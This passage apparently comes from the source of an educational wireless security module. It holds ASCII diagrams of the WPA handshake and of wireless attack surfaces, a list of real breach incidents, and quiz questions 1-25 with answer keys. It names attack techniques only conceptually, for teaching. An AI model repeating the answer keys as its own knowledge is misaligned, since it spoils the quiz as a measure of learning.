â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                                  â”‚
â”‚    ğŸ“± Client (Supplicant)                          ğŸ“¡ AP (Authenticator)        â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚  Both know: PSK (password) and SSID           â”‚                     â”‚
â”‚          â”‚  Both calculate: PMK = PBKDF2(PSK, SSID)      â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚â† â† â† â† â† Message 1 (ANonce) â† â† â† â† â† â† â† â† â† â†â”‚                     â”‚
â”‚          â”‚        AP sends random number (ANonce)        â”‚   â˜… PMKID is here!  â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚  Client generates SNonce                       â”‚                     â”‚
â”‚          â”‚  Client calculates PTK (session key)          â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Message 2 (SNonce + MIC) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚                     â”‚
â”‚          â”‚        Client sends SNonce & proof of PMK     â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚  AP calculates same PTK                        â”‚                     â”‚
â”‚          â”‚  AP verifies MIC to confirm PMK               â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚â† â† â† â† Message 3 (GTK + MIC) â† â† â† â† â† â† â† â† â†â”‚                     â”‚
â”‚          â”‚        AP sends group key, encrypted with PTK â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚  Client installs PTK and GTK                   â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Message 4 (ACK) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚                     â”‚
â”‚          â”‚        Client confirms key installation       â”‚                     â”‚
â”‚          â”‚                                                â”‚                     â”‚
â”‚          â”‚â•â•â•â•â•â•â•â•â• Encrypted communication begins â•â•â•â•â•â•â•â”‚                     â”‚
â”‚                                                                                  â”‚
â”‚  âš ï¸  ATTACKER WHO CAPTURES THIS CAN TRY PASSWORDS OFFLINE!                      â”‚
â”‚  PTK = PRF(PMK + ANonce + SNonce + MAC_AP + MAC_Client)                         â”‚
â”‚  If attacker guesses correct password â†’ same PTK â†’ matches MIC                  â”‚
â”‚                                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  channelOverlap: {
    title: "2.4 GHz Channel Overlap",
    description: "Why only channels 1, 6, 11 should be used",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    2.4 GHz WiFi Channel Overlap                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                                  â”‚
â”‚  Frequency:  2.412 GHz            2.437 GHz            2.462 GHz               â”‚
â”‚                 â”‚                    â”‚                    â”‚                     â”‚
â”‚  Channel:       1         6         11                                          â”‚
â”‚                 â”‚         â”‚         â”‚                                           â”‚
â”‚            â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”´â”€â”€â”€â”€â”â”Œâ”€â”€â”€â”´â”€â”€â”€â”€â”                                     â”‚
â”‚            â”‚   22 MHz â”‚â”‚  22 MHz â”‚â”‚  22 MHz â”‚                                   â”‚
â”‚            â”‚ Channel 1â”‚â”‚Channel 6â”‚â”‚Channel11â”‚                                   â”‚
â”‚            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                     â”‚
â”‚                                                                                  â”‚
â”‚  âœ… Non-overlapping channels (1, 6, 11) - Use these!                            â”‚
â”‚                                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   â”‚
â”‚                                                                                  â”‚
â”‚  BAD EXAMPLE - Overlapping channels cause interference:                          â”‚
â”‚                                                                                  â”‚
â”‚            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                      â”‚
â”‚            â”‚  Channel 3  â”‚                                                      â”‚
â”‚            â””â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                      â”‚
â”‚           â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                      â”‚
â”‚           â”‚  Channel 4   â”‚  â† These overlap and interfere!                      â”‚
â”‚           â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”˜                                                      â”‚
â”‚              â”Œâ”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                                  â”‚
â”‚              â”‚  Channel 5    â”‚                                                  â”‚
â”‚              â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                                  â”‚
â”‚                                                                                  â”‚
â”‚  ğŸ“Š Channel Usage Recommendation:                                                â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                             â”‚
â”‚  â”‚  2.4 GHz: Use only 1, 6, 11 (non-overlapping) â”‚                             â”‚
â”‚  â”‚  5 GHz:   Many more non-overlapping channels  â”‚                             â”‚
â”‚  â”‚  6 GHz:   All channels non-overlapping!       â”‚                             â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             â”‚
â”‚                                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
  attackSurfaces: {
    title: "Wireless Attack Surfaces",
    description: "Where attackers can target wireless networks",
    diagram: `
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                      Wireless Network Attack Surfaces                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                                  â”‚
â”‚                        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                     â”‚
â”‚                        â”‚   â˜ï¸ Internet    â”‚                                     â”‚
â”‚                        â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                                     â”‚
â”‚                                 â”‚                                               â”‚
â”‚                                 â”‚                                               â”‚
â”‚                        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                                     â”‚
â”‚           â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤   ğŸ“¡ Router/AP  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                         â”‚
â”‚           â”‚            â”‚  (Attack Target) â”‚            â”‚                        â”‚
â”‚           â”‚            â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜            â”‚                        â”‚
â”‚           â”‚                     â”‚                      â”‚                        â”‚
â”‚    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”                 â”‚
â”‚    â”‚ ğŸ’» Laptop   â”‚    â”‚ ğŸ“± Phone       â”‚    â”‚ ğŸŒ¡ï¸ IoT       â”‚                  â”‚
â”‚    â”‚ (Client)    â”‚    â”‚ (Client)       â”‚    â”‚ (Weak Target) â”‚                  â”‚
â”‚    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                 â”‚
â”‚                                                                                  â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•   â”‚
â”‚                                                                                  â”‚
â”‚  ATTACK VECTORS:                                                                 â”‚
â”‚                                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚ 1. ENCRYPTION   â”‚  â”‚ 2. MANAGEMENT   â”‚  â”‚ 3. CLIENT       â”‚                  â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                  â”‚
â”‚  â”‚ â€¢ WEP cracking  â”‚  â”‚ â€¢ Deauth flood  â”‚  â”‚ â€¢ Evil twin     â”‚                  â”‚
â”‚  â”‚ â€¢ WPA handshake â”‚  â”‚ â€¢ Beacon flood  â”‚  â”‚ â€¢ Karma attack  â”‚                  â”‚
â”‚  â”‚ â€¢ PMKID attack  â”‚  â”‚ â€¢ Disassoc      â”‚  â”‚ â€¢ Probe sniffingâ”‚                  â”‚
â”‚  â”‚ â€¢ WPS PIN brute â”‚  â”‚ â€¢ Rogue AP      â”‚  â”‚ â€¢ Honeypot      â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                  â”‚
â”‚  â”‚ 4. ENTERPRISE   â”‚  â”‚ 5. RF LAYER     â”‚  â”‚ 6. POST-EXPLOIT â”‚                  â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤                  â”‚
â”‚  â”‚ â€¢ Fake RADIUS   â”‚  â”‚ â€¢ Jamming       â”‚  â”‚ â€¢ MITM traffic  â”‚                  â”‚
â”‚  â”‚ â€¢ EAP downgrade â”‚  â”‚ â€¢ Replay attack â”‚  â”‚ â€¢ DNS hijack    â”‚                  â”‚
â”‚  â”‚ â€¢ Cert bypass   â”‚  â”‚ â€¢ Channel DoS   â”‚  â”‚ â€¢ SSL strip     â”‚                  â”‚
â”‚  â”‚ â€¢ Cred capture  â”‚  â”‚ â€¢ Signal intel  â”‚  â”‚ â€¢ Lateral move  â”‚                  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                  â”‚
â”‚                                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜`,
  },
};

// Real-world wireless security incidents
const realWorldIncidents = [
  {
    name: "TJX Data Breach (2007)",
    year: "2005-2007",
    type: "WEP Cracking + Pivoting",
    impact: "94 million credit cards stolen, $256M+ in costs",
    description: "Attackers wardrove TJX retail stores in Miami, found WEP-protected WiFi networks, cracked them, and accessed internal systems over 18 months. They installed packet sniffers to capture credit card data.",
    lessonsLearned: [
      "WEP was known broken for years but still in use",
      "Wireless security directly impacts PCI DSS compliance",
      "Lack of network segmentation enabled lateral movement",
      "No monitoring detected the extended breach",
    ],
    attackChain: "War driving â†’ WEP crack â†’ Network access â†’ Packet sniffing â†’ Data exfiltration",
  },
  {
    name: "Marriott/Starwood Breach (2014-2018)",
    year: "2014-2018",
    type: "Lateral Movement via Hotel Networks",
    impact: "500 million guest records exposed",
    description: "While not purely a WiFi attack, the breach involved compromised hotel networks. Guest WiFi networks that weren't properly segmented from corporate systems provided pathways for attackers to move laterally.",
    lessonsLearned: [
      "Guest networks must be completely isolated",
      "IoT devices in rooms can be pivot points",
      "Regular penetration testing is essential",
      "Network monitoring must cover all segments",
    ],
    attackChain: "Initial compromise â†’ Hotel network access â†’ Lateral movement â†’ Database access â†’ Long-term persistence",
  },
  {
    name: "KRACK Attack Disclosure (2017)",
    year: "October 2017",
    type: "Protocol Vulnerability",
    impact: "All WPA2 implementations affected worldwide",
    description: "Security researcher Mathy Vanhoef discovered that the WPA2 4-way handshake could be manipulated to reinstall an already-used key, allowing traffic decryption and potentially injection. Every WiFi device was vulnerable.",
    lessonsLearned: [
      "Even 'secure' protocols can have implementation flaws",
      "Client devices are often more vulnerable than APs",
      "Prompt patching is critical for all devices",
      "HTTPS provides backup protection layer",
    ],
    attackChain: "MitM position â†’ Force handshake retransmission â†’ Key reinstallation â†’ Traffic decryption â†’ Packet injection",
  },
  {
    name: "Dragonblood WPA3 Vulnerabilities (2019)",
    year: "April 2019",
    type: "Protocol Implementation Flaws",
    impact: "New WPA3 standard had flaws before wide deployment",
    description: "Same researcher found that WPA3's SAE (Dragonfly) handshake was vulnerable to side-channel attacks and downgrade attacks. Some implementations leaked timing information enabling password recovery.",
    lessonsLearned: [
      "New standards need extensive security review",
      "Side-channel attacks remain practical threat",
      "Transition modes (WPA3/WPA2) create downgrade risk",
      "Implementation matters as much as protocol design",
    ],
    attackChain: "Identify WPA3 network â†’ Side-channel measurement â†’ Timing analysis â†’ Password recovery attempt",
  },
  {
    name: "DEF CON Wall of Sheep (Ongoing)",
    year: "1999-Present",
    type: "Credential Sniffing",
    impact: "Educational - demonstrates unencrypted traffic dangers",
    description: "At the DEF CON hacker conference, volunteers run a 'Wall of Sheep' that passively captures credentials sent over the conference WiFi in cleartext. Usernames and partial passwords are displayed publicly.",
    lessonsLearned: [
      "Never use unencrypted protocols on public WiFi",
      "HTTPS everywhere is essential",
      "VPN usage protects against sniffing",
      "People still send credentials in cleartext",
    ],
    attackChain: "Passive sniffing â†’ Protocol inspection â†’ Credential extraction â†’ Public display (educational)",
  },
  {
    name: "Dark Hotel APT Campaign (2007-2014)",
    year: "2007-2014",
    type: "Targeted Hotel WiFi Attacks",
    impact: "Executive-level targets at luxury hotels compromised",
    description: "Sophisticated APT group targeted business executives staying at luxury Asian hotels. They compromised hotel WiFi systems to serve malware through fake software updates when executives connected.",
    lessonsLearned: [
      "Hotel WiFi should never be trusted",
      "Corporate VPN should be mandatory for travel",
      "Fake update prompts are effective social engineering",
      "High-value targets face elevated wireless risks",
    ],
    attackChain: "Hotel network compromise â†’ Target identification â†’ Fake update injection â†’ Malware installation â†’ Data exfiltration",
  },
];

// 75-question bank for wireless penetration testing quiz
const wirelessQuestionBank: WirelessQuizQuestion[] = [
  // ============ FUNDAMENTALS (15 questions) ============
  { id: 1, question: "Why can attackers 'listen' to WiFi traffic even if they're not connected to the network?", options: ["They have special government access", "WiFi signals travel through the air and can be received by anyone with an antenna", "WiFi only works with registered devices", "Encryption prevents anyone from seeing the signals"], correctAnswer: 1, explanation: "WiFi uses radio waves that propagate through the air. Anyone with a wireless adapter in monitor mode can capture these signals, just like a radio can receive FM stations. Encryption protects the content, but not the existence of the transmission.", topic: "Fundamentals" },
  { id: 2, question: "What is the difference between 2.4 GHz and 5 GHz WiFi?", options: ["2.4 GHz is faster but shorter range", "5 GHz is faster but shorter range, and penetrates walls less effectively", "They are exactly the same, just different names", "2.4 GHz is only for older devices"], correctAnswer: 1, explanation: "5 GHz offers faster speeds and less interference (more channels), but the higher frequency means shorter range and worse wall penetration. 2.4 GHz travels farther but is more crowded and slower.", topic: "Fundamentals" },
  { id: 3, question: "What is a beacon frame in WiFi?", options: ["An encrypted data packet", "A frame sent by APs to announce their presence and capabilities", "A client's connection request", "A deauthentication message"], correctAnswer: 1, explanation: "Beacon frames are broadcast by access points every ~100ms to announce their SSID, supported rates, encryption type, and other capabilities. Clients use these to discover and identify available networks.", topic: "Fundamentals" },
  { id: 4, question: "What is an SSID in wireless networking?", options: ["The router's IP address", "The network name that identifies a wireless network", "The encryption key used for security", "The MAC address of the access point"], correctAnswer: 1, explanation: "SSID (Service Set Identifier) is the human-readable name of a wireless network. It's broadcast in beacon frames and used by clients to identify and connect to specific networks.", topic: "Fundamentals" },
  { id: 5, question: "What is a BSSID?", options: ["The network password", "The MAC address of the access point", "A type of encryption", "The network's channel number"], correctAnswer: 1, explanation: "BSSID (Basic Service Set Identifier) is typically the MAC address of the access point's radio interface. It uniquely identifies a specific AP, even when multiple APs share the same SSID.", topic: "Fundamentals" },
  { id: 6, question: "How many non-overlapping channels exist in the 2.4 GHz band?", options: ["11 channels", "3 channels (1, 6, 11)", "14 channels", "6 channels"], correctAnswer: 1, explanation: "While there are 11-14 channels in 2.4 GHz (depending on region), only channels 1, 6, and 11 are non-overlapping. Using other channels causes interference with neighbors.", topic: "Fundamentals" },
  { id: 7, question: "What is the purpose of a probe request frame?", options: ["To disconnect clients from a network", "For clients to actively search for available networks", "To encrypt data transmissions", "To authenticate with the access point"], correctAnswer: 1, explanation: "Probe requests are sent by clients to actively discover networks. The client broadcasts the SSIDs it's looking for, and APs respond with probe responses if they match.", topic: "Fundamentals" },
  { id: 8, question: "What does CSMA/CA stand for and what does it do?", options: ["Central Security Management Authority - manages encryption", "Carrier Sense Multiple Access with Collision Avoidance - prevents simultaneous transmissions", "Client-Server Management Architecture - handles connections", "Channel Selection and Modulation Algorithm - optimizes speed"], correctAnswer: 1, explanation: "CSMA/CA is the medium access method used in WiFi. Devices listen before transmitting and use random backoff timers to avoid collisions, since wireless can't detect collisions like wired Ethernet.", topic: "Fundamentals" },
  { id: 9, question: "What is the typical range of a standard home WiFi router?", options: ["10-20 meters indoors", "30-50 meters indoors, 100+ meters outdoors", "500+ meters in all conditions", "5-10 meters maximum"], correctAnswer: 1, explanation: "Standard home routers typically cover 30-50 meters indoors (walls reduce range) and 100+ meters outdoors with line of sight. Range depends on frequency, power, obstacles, and interference.", topic: "Fundamentals" },
  { id: 10, question: "What is OFDM in wireless communications?", options: ["A type of antenna design", "A modulation technique that splits data across multiple subcarriers", "A security protocol", "A method for extending WiFi range"], correctAnswer: 1, explanation: "OFDM (Orthogonal Frequency Division Multiplexing) divides the channel into many narrow subcarriers, transmitting data in parallel. This provides resilience against interference and multipath fading.", topic: "Fundamentals" },
  { id: 11, question: "What is the hidden node problem in wireless networks?", options: ["When an AP doesn't broadcast its SSID", "When two clients can't hear each other but can both reach the AP, causing collisions", "When a client is too far from the AP", "When encryption hides the network from scanners"], correctAnswer: 1, explanation: "The hidden node problem occurs when two clients are in range of an AP but not each other. They can't detect each other's transmissions, leading to collisions at the AP. RTS/CTS helps mitigate this.", topic: "Fundamentals" },
  { id: 12, question: "What is a wireless frame's FCS field used for?", options: ["Encryption of the payload", "Error detection using CRC checksum", "Frame sequencing", "Power management"], correctAnswer: 1, explanation: "FCS (Frame Check Sequence) is a 32-bit CRC at the end of every 802.11 frame. The receiver recalculates the CRC and compares it to detect transmission errors. Corrupted frames are silently discarded.", topic: "Fundamentals" },
  { id: 13, question: "What is the difference between infrastructure and ad-hoc WiFi modes?", options: ["Infrastructure is faster, ad-hoc is more secure", "Infrastructure uses an AP as central hub, ad-hoc is direct device-to-device", "They are the same thing with different names", "Ad-hoc requires special hardware"], correctAnswer: 1, explanation: "Infrastructure mode uses an access point as a central hub - all traffic goes through it. Ad-hoc (IBSS) mode allows direct device-to-device communication without an AP, forming a peer-to-peer network.", topic: "Fundamentals" },
  { id: 14, question: "What is WiFi 6E and what makes it different?", options: ["A faster version of WiFi 6", "WiFi 6 extended to the 6 GHz band, providing more channels and less interference", "An enterprise-only WiFi standard", "A security upgrade to WiFi 6"], correctAnswer: 1, explanation: "WiFi 6E extends WiFi 6 (802.11ax) into the 6 GHz band, adding up to 1200 MHz of new spectrum. This provides many more channels with no legacy device interference, enabling faster and more reliable connections.", topic: "Fundamentals" },
  { id: 15, question: "What is MU-MIMO and why is it beneficial?", options: ["A type of antenna that increases range", "Multi-User MIMO allows simultaneous communication with multiple clients", "A security feature in WPA3", "A method for reducing power consumption"], correctAnswer: 1, explanation: "MU-MIMO (Multi-User Multiple Input Multiple Output) allows an AP to communicate with multiple clients simultaneously using spatial streams, rather than one at a time. This significantly improves network efficiency and throughput.", topic: "Fundamentals" },

  // ============ ENCRYPTION & PROTOCOLS (15 questions) ============
  { id: 16, question: "What is the main weakness that makes WEP encryption easy to crack?", options: ["It uses 256-bit encryption which is too slow", "The password is transmitted in plain text", "It reuses encryption values (IVs) that can be collected to find the key", "It requires a physical connection to crack"], correctAnswer: 2, explanation: "WEP uses a 24-bit Initialization Vector (IV) that frequently repeats. By collecting enough packets with reused IVs, attackers can mathematically recover the encryption key in minutes.", topic: "Encryption" },
  { id: 17, question: "Why is WPA3 more secure than WPA2?", options: ["It uses longer passwords", "It uses SAE (Simultaneous Authentication of Equals) providing forward secrecy", "It only works on 5GHz networks", "It requires enterprise certificates"], correctAnswer: 1, explanation: "WPA3 uses SAE (Dragonfly handshake) which provides forward secrecy - even if the password is later compromised, previously captured traffic cannot be decrypted. It also protects against offline dictionary attacks.", topic: "Encryption" },
  { id: 18, question: "What encryption algorithm does WPA2 use?", options: ["RC4", "AES-CCMP", "DES", "Blowfish"], correctAnswer: 1, explanation: "WPA2 uses AES (Advanced Encryption Standard) with CCMP (Counter Mode with CBC-MAC Protocol). This replaced the vulnerable RC4/TKIP used in WEP and WPA, providing much stronger security.", topic: "Encryption" },
  { id: 19, question: "What is TKIP and why was it created?", options: ["A replacement for AES encryption", "A temporary fix for WEP weaknesses while maintaining hardware compatibility", "The latest WiFi security standard", "A tool for cracking passwords"], correctAnswer: 1, explanation: "TKIP (Temporal Key Integrity Protocol) was designed as a firmware upgrade for WEP hardware. It added per-packet key mixing and a message integrity check, but is now deprecated due to vulnerabilities.", topic: "Encryption" },
  { id: 20, question: "What is the purpose of the 4-way handshake in WPA/WPA2?", options: ["To transfer the network password", "To derive and confirm the session encryption keys", "To check signal strength", "To assign IP addresses"], correctAnswer: 1, explanation: "The 4-way handshake derives the Pairwise Transient Key (PTK) from the PMK, ANonce, SNonce, and MAC addresses. It confirms both parties have the correct PMK without transmitting it, and establishes fresh session keys.", topic: "Encryption" },
  { id: 21, question: "What is PMK in WPA/WPA2 security?", options: ["A temporary session key", "The Pairwise Master Key derived from the password and SSID", "The router's public key", "A certificate authority identifier"], correctAnswer: 1, explanation: "PMK (Pairwise Master Key) is derived from the PSK (password) and SSID using PBKDF2. It's the master secret used to derive session keys during the 4-way handshake. The same password on different SSIDs produces different PMKs.", topic: "Encryption" },
  { id: 22, question: "What is forward secrecy and why does WPA3 provide it?", options: ["Encrypting future traffic with past keys", "Ensuring past captured traffic can't be decrypted even if the password is later compromised", "Automatically changing the password periodically", "Blocking unknown devices from connecting"], correctAnswer: 1, explanation: "Forward secrecy (provided by SAE in WPA3) means each session uses unique keys. Even if an attacker captures encrypted traffic and later obtains the password, they cannot decrypt the old traffic.", topic: "Encryption" },
  { id: 23, question: "What is the GTK in WiFi encryption?", options: ["A graphical toolkit for WiFi management", "Group Temporal Key used for broadcast/multicast traffic", "A government tracking key", "The global timestamp keeper"], correctAnswer: 1, explanation: "GTK (Group Temporal Key) encrypts broadcast and multicast traffic that goes to all clients. Unlike the PTK (unique per client), the GTK is shared among all authenticated clients on the network.", topic: "Encryption" },
  { id: 24, question: "What vulnerability does the KRACK attack exploit?", options: ["Weak passwords", "Key reinstallation in the 4-way handshake allowing nonce reuse", "Unencrypted beacon frames", "Buffer overflow in the driver"], correctAnswer: 1, explanation: "KRACK (Key Reinstallation Attack) manipulates the 4-way handshake to reinstall an already-used key, forcing nonce reuse. This breaks the encryption guarantees of WPA2, allowing traffic decryption and injection.", topic: "Encryption" },
  { id: 25, question: "What is OWE (Opportunistic Wireless Encryption)?", options: ["A type of enterprise authentication", "Encryption for open networks without requiring a password", "A WEP replacement", "A VPN protocol"], correctAnswer: 1, explanation: "OWE provides encryption on open networks using Diffie-Hellman key exchange. Users connect without a password, but traffic is still encrypted, preventing passive eavesdropping on public WiFi.", topic: "Encryption" },
